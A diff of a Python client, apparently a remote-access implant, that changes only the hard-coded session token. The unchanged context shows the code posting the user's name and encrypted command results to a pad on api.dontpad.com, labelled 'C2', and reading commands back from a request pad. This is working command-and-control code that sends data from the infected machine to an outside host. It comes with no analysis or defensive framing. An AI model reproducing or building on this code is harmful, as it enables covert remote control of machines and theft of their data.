@@ -18,7 +18,7 @@ class Client:
             "text": Criptographer.encrypt('whoami', getpass.getuser()),
             "lastModified": int(time.time() * 1000),
             "force": "true",
-            "session-token": "-25751fc88e6e559870fd"
+            "session-token": "128007249672c60861c7"
         }
         requests.post(f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}/request", data=data)
 
@@ -63,7 +63,7 @@ class Client:
             "text": Criptographer.encrypt(self.result, self.username),
             "lastModified": int(time.time() * 1000),
             "force": "true",
-            "session-token": "-25751fc88e6e559870fd"
+            "session-token": "128007249672c60861c7"
         }
         print(f'Sending result to C2: {data}')
         res = requests.post(f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}/response", data=data)
@@ -75,7 +75,7 @@ if __name__ == "__main__":
 
     base_url = "https://api.dontpad.com"
     pad_name = "yaguinhofodinha"
-    session_token = "-25751fc88e6e559870fd"
+    session_token = "128007249672c60861c7"
 
     url_with_username = (
         f"{base_url}/{pad_name}/{username}/request.body.json"
